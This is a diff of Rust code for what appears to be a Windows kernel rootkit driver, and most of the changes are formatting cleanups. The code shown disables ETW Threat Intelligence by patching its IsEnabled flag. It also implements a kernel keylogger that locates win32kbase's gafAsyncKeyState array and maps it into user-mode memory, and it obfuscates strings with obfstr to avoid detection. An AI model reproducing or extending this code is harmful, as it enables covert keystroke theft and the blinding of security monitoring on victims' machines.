@@ -1,23 +1,18 @@
 use core::{ffi::c_void, ptr::null_mut};
 use obfstr::obfstr;
 use wdk_sys::{
-    *, ntddk::*, _MODE::UserMode, 
-    _MM_PAGE_PRIORITY::NormalPagePriority,
-    _MEMORY_CACHING_TYPE::MmCached
+    _MEMORY_CACHING_TYPE::MmCached, 
+    _MM_PAGE_PRIORITY::NormalPagePriority, 
+    _MODE::UserMode,
+    ntddk::*, 
+    *,
 };
 
+use crate::{attach::ProcessAttach, error::ShadowError};
 use crate::{
-    *, 
-    error::ShadowError,
-    attach::ProcessAttach,
-    patterns::{
-        scan_for_pattern, 
-        ETWTI_PATTERN
-    },
-    address::{
-        get_function_address, 
-        get_module_base_address
-    },
+    address::{get_function_address, get_module_base_address},
+    patterns::{ETWTI_PATTERN, scan_for_pattern},
+    *,
 };
 
 /// Represents ETW (Event Tracing for Windows) in the operating system.
@@ -47,7 +42,6 @@ impl Etw {
         // Calculate the offset to the TRACE_ENABLE_INFO structure and modify the IsEnabled field
         let trace_info = etwi_handle.offset(0x20).offset(0x60) as *mut TRACE_ENABLE_INFO;
         (*trace_info).IsEnabled = if enable { 0x01 } else { 0x00 };
-
         Ok(STATUS_SUCCESS)
     }
 }
@@ -114,19 +108,34 @@ impl Keylogger {
         let gaf_async_key_state_address = Self::get_gafasynckeystate_address()?;
 
         // Allocate an MDL (Memory Descriptor List) to manage the memory
-        let mdl = IoAllocateMdl(gaf_async_key_state_address.cast(), size_of::<[u8; 64]>() as u32, 0, 0, null_mut());
+        let mdl = IoAllocateMdl(
+            gaf_async_key_state_address.cast(),
+            size_of::<[u8; 64]>() as u32,
+            0,
+            0,
+            null_mut(),
+        );
+
         if mdl.is_null() {
-            return Err(ShadowError::FunctionExecutionFailed("IoAllocateMdl", line!()));
+            return Err(ShadowError::ApiCallFailed("IoAllocateMdl", -1));
         }
 
         // Build the MDL for the non-paged pool
         MmBuildMdlForNonPagedPool(mdl);
 
         // Map the locked pages into user-mode address space
-        let address = MmMapLockedPagesSpecifyCache(mdl, UserMode as i8, MmCached, null_mut(), 0, NormalPagePriority as u32);
+        let address = MmMapLockedPagesSpecifyCache(
+            mdl,
+            UserMode as i8,
+            MmCached,
+            null_mut(),
+            0,
+            NormalPagePriority as u32,
+        );
+
         if address.is_null() {
             IoFreeMdl(mdl);
-            return Err(ShadowError::FunctionExecutionFailed("MmMapLockedPagesSpecifyCache", line!()));
+            return Err(ShadowError::ApiCallFailed("MmMapLockedPagesSpecifyCache", -1));
         }
 
         Ok(address)
@@ -143,7 +152,8 @@ impl Keylogger {
         let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
 
         // Get the address of the NtUserGetAsyncKeyState function
-        let function_address = get_function_address(obfstr!("NtUserGetAsyncKeyState"), module_address)?;
+        let function_address =
+            get_function_address(obfstr!("NtUserGetAsyncKeyState"), module_address)?;
 
         // Search for the pattern that identifies the gafAsyncKeyState array
         // fffff4e1`18e41bae 48 8b 05 0b 4d 20 00  mov rax,qword ptr [win32kbase!gafAsyncKeyState (fffff4e1`190468c0)]
